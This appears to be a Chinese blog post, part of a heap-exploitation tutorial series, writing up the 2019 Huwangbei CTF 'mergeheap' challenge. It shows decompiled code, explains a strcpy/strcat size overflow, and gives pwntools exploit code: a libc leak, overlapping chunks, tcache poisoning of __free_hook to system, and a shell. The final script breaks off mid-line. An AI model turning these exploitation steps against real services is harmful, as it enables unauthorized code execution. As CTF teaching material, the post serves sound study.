<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 4.0.0"><meta name="baidu-site-verification" content="CpUtq7PVXz"><meta name="google-site-verification" content="BDfwg8yARZd_uEasrK3RvZGmWmUg37NQSE3cumBTgMI"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta name="baidu-site-verification" content="64WFuMirLucMnUVd"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Pisces",version:"7.4.2",exturl:!0,sidebar:{position:"left",display:"post",offset:12,onmobile:!1},copycode:{enable:!1,show_result:!1,style:null},back2top:{enable:!0,sidebar:!1,scrollpercent:!1},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!1,mediumzoom:!1,lazyload:!1,pangu:!1,algolia:{appID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},path:"search.xml",motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},translation:{copy_button:"Copy",copy_success:"Copied",copy_failure:"Copy failed"},sidebarPadding:40}</script><meta name="description" content="pwn堆入门系列教程6pwn堆入门系列教程1pwn堆入门系列教程2pwn堆入门系列教程3pwn堆入门系列教程4pwn堆入门系列教程5要将别人的东西转化成自己的东西，还是得实操，自己去操作番才可以得到些东西，学了这么久，这几天的比赛也算是用上了，有unlink，有double free，这些操作用上了2019护网杯 mergeheap"><meta name="keywords" content="pwn， 堆"><meta property="og:type" content="article"><meta property="og:title" content="pwn堆入门系列教程6"><meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;posts&#x2F;84788ee9&#x2F;index.html"><meta property="og:site_name" content="NoOne-hub"><meta property="og:description" content="pwn堆入门系列教程6pwn堆入门系列教程1pwn堆入门系列教程2pwn堆入门系列教程3pwn堆入门系列教程4pwn堆入门系列教程5要将别人的东西转化成自己的东西，还是得实操，自己去操作番才可以得到些东西，学了这么久，这几天的比赛也算是用上了，有unlink，有double free，这些操作用上了2019护网杯 mergeheap"><meta property="og:locale" content="zh-Hans"><meta property="og:updated_time" content="2019-11-03T12:45:41.956Z"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://noone-hub.github.io/posts/84788ee9/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,isPage:!1,isArchive:!1}</script><title>pwn堆入门系列教程6 | NoOne-hub</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-meta"><div><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">NoOne-hub</span><span class="logo-line-after"><i></i></span></a></div><h1 class="site-subtitle" itemprop="description">A place that No One knw</h1></div><div class="site-nav-toggle"><div class="toggle" aria-label="Toggle navigation bar"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-fw fa-home"></i> Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i> About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i> Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i> Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i> Archives</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i> Search</a></li></ul></nav><div class="site-search"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"> <input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Searching..." spellcheck="false" type="text" id="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"></div></div><div class="search-pop-overlay"></div></div></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div> <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL05vT25lLWh1Yg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115 130 115 142 142 250 250 250 0Z"></path><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4L133.7 101.6C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8Z" fill="currentColor" class="octo-body"></path></svg></span><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content"><div class="posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans"><link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/posts/84788ee9/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/photo.jpg"><meta itemprop="name" content="NoOne"><meta itemprop="description" content="One people that no one know"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="NoOne-hub"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> pwn堆入门系列教程6</h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2019-10-18 03:14:41" itemprop="dateCreated datePublished" datetime="2019-10-18T03:14:41+08:00">2019-10-18</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i></span> <span class="post-meta-item-text">Edited on</span> <time title="Modified: 2019-11-03 20:45:41" itemprop="dateModified" datetime="2019-11-03T20:45:41+08:00">2019-11-03</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index"><span itemprop="name">二进制</span></a></span> , <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span> , <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a></span></span><span id="/posts/84788ee9/" class="post-meta-item leancloud_visitors" data-flag-title="pwn堆入门系列教程6" title="Views"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">Views:</span><span class="leancloud-visitors-count"></span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i></span> <span class="post-meta-item-text">Valine:</span><a title="valine" href="/posts/84788ee9/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/posts/84788ee9/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="Symbols count in article"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">Symbols count in article:</span> <span>13k</span></span><span class="post-meta-item" title="Reading time"><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i></span> <span class="post-meta-item-text">Reading time &asymp;</span> <span>12 mins.</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="pwn堆入门系列教程6"><a href="#pwn堆入门系列教程6" class="headerlink" title="pwn堆入门系列教程6"></a>pwn堆入门系列教程6</h1><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjM3Nw==" title="https://xz.aliyun.com/t/6377">pwn堆入门系列教程5<i class="fa fa-external-link"></i></span></p><p>要将别人的东西转化成自己的东西，还是得实操，自己去操作番才可以得到些东西，学了这么久，这几天的比赛也算是用上了，有unlink，有double free，这些操作用上了</p><h2 id="2019护网杯-mergeheap"><a href="#2019护网杯-mergeheap" class="headerlink" title="2019护网杯 mergeheap"></a>2019护网杯 mergeheap</h2><a id="more"></a><p>我每次看到题目名字跟函数名字相同，我就知道点就在那个函数上，然而我当时已经看出这里有溢出了，然后调试的时候以为没覆盖到，原来只能覆盖到size，还是脑子不清晰，所以才会这样</p><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol><li>新建一个堆块</li><li>展示堆块内容</li><li>删除一个堆块</li><li>合并两个堆块内容</li><li>退出</li></ol><p>乍一看就只有合并比较可疑了，通常堆题没合并，而题目又是mergeheap</p><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_E29</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">14</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"full"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx1:"</span>);</span><br><span class="line">  v2 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">14</span> || !qword_2020A0[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx2:"</span>);</span><br><span class="line">  v3 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">14</span> || !qword_2020A0[v3] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  v4 = dword_202060[v2] + dword_202060[v3];</span><br><span class="line">  qword_2020A0[i] = <span class="built_in">malloc</span>(v4);</span><br><span class="line">  <span class="built_in">strcpy</span>(qword_2020A0[i], qword_2020A0[v2]);</span><br><span class="line">  <span class="built_in">strcat</span>(qword_2020A0[i], qword_2020A0[v3]);</span><br><span class="line">  dword_202060[i] = v4;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>merge这里的strcpy跟strcat都是遇到\x00结束的，所以，我们如果将下一个堆块的pre_size当数据段来用的话，就可以复制到size部分，merge的时候会覆盖到下一个堆块的size，溢出覆盖size</p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_D72</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx:"</span>);</span><br><span class="line">  v2 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(qword_2020A0[v2]);</span><br><span class="line">    qword_2020A0[v2] = <span class="number">0L</span>L;</span><br><span class="line">    v0 = dword_202060;</span><br><span class="line">    dword_202060[v2] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free过后，堆块内容未清空，也就是说，我们申请一个堆块，然后free掉，在申请到这个堆块时候，就可以查看原来堆块的内容</p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol><li>初始化堆块操作</li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) != size:</span><br><span class="line">        io.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1, idx2)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx1))</span><br><span class="line">    io.sendline(str(idx2))</span><br></pre></td></tr></table></figure><ol start="2"><li>填满tcache，并利用unsortbin泄露libc地址</li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x100</span>, str(i)*<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">0x8</span>, <span class="string">'0'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">"0"</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3ebda0</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br></pre></td></tr></table></figure><p>我反过来删除是因为show好弄些，也可以正向删除，show(7)</p><ol start="3"><li>重点，这里的大小要构造好，被复制和被覆盖的得分清楚，最后造成overlap chunk，然后修改tcache的fd指针成malloc_hook就行了，这里跟fastbin不太相似，fastbin这种攻击大小限制得是0x70大小chunk，因为错位的时候只有0x7f通常</li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xe0</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'2'</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>) <span class="comment">#4 被复制的size</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'5'</span>*<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'6'</span>*<span class="number">0x20</span>) <span class="comment">#6 size部分将被覆盖</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">merge(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'7'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">7</span>) </span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#构造overlap chunk</span></span><br></pre></td></tr></table></figure><ol start="4"><li>getshell</li></ol><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(free_hook)</span><br><span class="line">add(<span class="number">0x80</span>, payload) <span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="Code" data-labels_right=":" data-labels_copy="Copy Code"><span class="code-caption-label"></span><a class="code-caption-copy">Copy Code</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'mergeheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'mergeheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc-2.27.so'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) != size:</span><br><span class="line">        io.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1, idx2)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx1))</span><br><span class="line">    io.sendline(str(idx2))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        add(<span class="number">0x100</span>, str(i)*<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        delete(<span class="number">7</span>-i)</span><br><span class="line">    add(<span class="number">0x8</span>, <span class="string">'0'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"0"</span>*<span class="number">8</span>)</span><br><span class="line">    libc_base = 